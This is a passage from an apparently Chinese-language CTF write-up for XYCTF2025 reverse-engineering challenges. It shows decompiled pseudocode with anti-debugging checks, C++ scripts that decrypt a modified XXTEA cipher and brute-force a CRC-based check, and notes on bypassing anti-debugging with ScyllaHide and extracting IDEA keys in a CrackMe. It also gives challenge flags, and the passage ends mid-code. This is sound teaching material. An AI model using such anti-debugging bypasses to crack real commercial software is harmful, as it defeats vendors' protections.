class="type">unsigned</span> __int64 v34; <span class="comment">// [rsp+410h] [rbp-28h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+428h] [rbp-10h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+430h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v36 = v3;</span><br><span class="line">  v35 = v4;</span><br><span class="line">  v7 = v10;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">170</span>; i; --i )</span><br><span class="line">    *v7++ = <span class="number">-858993460</span>;</span><br><span class="line">  v34 = (<span class="type">unsigned</span> __int64)v10 ^ <span class="number">0x1401D9000LL</span>;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(<span class="number">0x1401ED104LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A1190LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">IsDebuggerPresent</span>() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_1400868E3</span>();</span><br><span class="line">    v12 = v11;</span><br><span class="line">    <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0x10u</span>);</span><br><span class="line">    v23 = <span class="number">8</span>;</span><br><span class="line">    v29 = <span class="number">8</span>;</span><br><span class="line">    v20 = <span class="number">12</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0x61C88646</span>;</span><br><span class="line">    v21 = <span class="number">0x95664B48</span>;</span><br><span class="line">    v19 = <span class="number">7</span>;</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    CurrentProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="built_in">CheckRemoteDebuggerPresent</span>(CurrentProcess, &amp;v24);</span><br><span class="line">    <span class="keyword">if</span> ( !v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">j_srand</span>(<span class="number">0xAABBu</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">        v22[j] = <span class="built_in">j_rand</span>();</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v29 = v19--;</span><br><span class="line">        v30 = v29 != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v30 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v15 += v16;</span><br><span class="line">        v17 = (v15 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v23; ++k )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = __rdtsc();</span><br><span class="line">          v13 = *(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + <span class="number">1</span>) % v23)];</span><br><span class="line">          v29 = (<span class="number">4</span> * v13) ^ (*(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + v23 - <span class="number">1</span>) % v23)] &gt;&gt; <span class="number">5</span>);</span><br><span class="line">          v30 = k + v23 - <span class="number">1</span>;</span><br><span class="line">          v31 = ((<span class="number">16</span> * *(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)]) ^ (v13 &gt;&gt; <span class="number">3</span>)) + v29;</span><br><span class="line">          v32 = ((<span class="type">unsigned</span> __int8)v17 ^ (<span class="type">unsigned</span> __int8)k) &amp; <span class="number">3</span>;</span><br><span class="line">          v33 = (((*(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)] ^ v22[v32]) + (v13 ^ v15)) ^ v31) + *(_DWORD *)&amp;v12[<span class="number">4</span> * k];</span><br><span class="line">          *(_DWORD *)&amp;v12[<span class="number">4</span> * k] = v33;</span><br><span class="line">          v14 = v33;</span><br><span class="line">          <span class="keyword">if</span> ( __rdtsc() - v26 &gt; <span class="number">0x83C0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v27[<span class="number">0</span>] = <span class="number">0xA9934E2F</span>;</span><br><span class="line">      v27[<span class="number">1</span>] = <span class="number">0x30B90FA</span>;</span><br><span class="line">      v27[<span class="number">2</span>] = <span class="number">0xDCBF1D3</span>;</span><br><span class="line">      v27[<span class="number">3</span>] = <span class="number">0x328B5BDE</span>;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">4</span>; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v27[m] != v10[m + <span class="number">2</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11A8LL</span>);</span><br><span class="line">          <span class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11C0LL</span>);</span><br><span class="line">      <span class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">  <span class="built_in">j__RTC_CheckStackVars</span>(&amp;v9, (_RTC_framedesc *)&amp;unk_1401A1140);</span><br><span class="line">  <span class="built_in">j___security_check_cookie</span>((<span class="type">unsigned</span> __int64)v10 ^ v34);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_1401F8E9B</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。</p><p><strong>注：写WP时用的是旧版附件分析，缺失了后面16字节密文</strong></p><p>完整密文数据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line"><span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span></span><br></pre></td></tr></table></figure><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88646</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">                <span class="keyword">if</span> (z == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (y == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0xAABB</span>);</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> Enc[]&#123;</span><br><span class="line">        <span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line">        <span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key[i] = <span class="built_in">rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">xxtea</span>(Enc, <span class="number">-8</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Enc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{th15_15_51mpLe_obf_R19Ht?}</p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。</p><p><img src="/2025/04/07/XYCTF2025/47.png"></p><p><img src="/2025/04/07/XYCTF2025/48.png"></p><p>从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。</p><p><img src="/2025/04/07/XYCTF2025/49.png"></p><p><img src="/2025/04/07/XYCTF2025/50.png"></p><p><img src="/2025/04/07/XYCTF2025/51.png"></p><p><img src="/2025/04/07/XYCTF2025/52.png"></p><p>从TLS那边可以看到启动了一个线程，线程函数如下</p><p><img src="/2025/04/07/XYCTF2025/53.png"></p><p>这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。</p><p><img src="/2025/04/07/XYCTF2025/54.png"></p><p>将这边v4都异或上0xBB会得到”flag{“五个字符，就明白这边是检测输入flag开头是否为”flag{“，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。</p><p><img src="/2025/04/07/XYCTF2025/55.png"></p><p>mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。</p><p>这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。</p><p><img src="/2025/04/07/XYCTF2025/56.png"></p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">      <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">      <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">      <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">      <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">      <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">      <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">      <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">      <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">      <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">      <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">      <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">      <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">      <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">      <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">      <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">      <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">      <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">      <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">      <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">      <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">      <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">      <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">      <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">      <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">      <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">      <span class="number">0x98D220BD</span>, <span class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">      <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">      <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">      <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">      <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">      <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">      <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">      <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">      <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">      <span class="number">0x46A95BAD</span>,</span><br><span class="line">      <span class="number">0x1CAC84B6</span>,</span><br><span class="line">      <span class="number">0xA67CB2B2</span>,</span><br><span class="line">      <span class="number">0x32188937</span>,</span><br><span class="line">      <span class="number">0x4872D39F</span>,</span><br><span class="line">      <span class="number">0xF2A2E59B</span>,</span><br><span class="line">      <span class="number">0x011B94D2</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 爆破前7字节</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; c++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>得到前七个字符为：<strong>moshui_</strong></p><p>第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。</p><p><img src="/2025/04/07/XYCTF2025/57.png"></p><p><img src="/2025/04/07/XYCTF2025/58.png"></p><p>开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。</p><p>由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。</p><p>密钥：<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p><p><img src="/2025/04/07/XYCTF2025/59.png"></p><p>然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为’}’，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。</p><p><img src="/2025/04/07/XYCTF2025/60.png"></p><p>加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。</p><p>利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。</p><p><img src="/2025/04/07/XYCTF2025/61.png"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 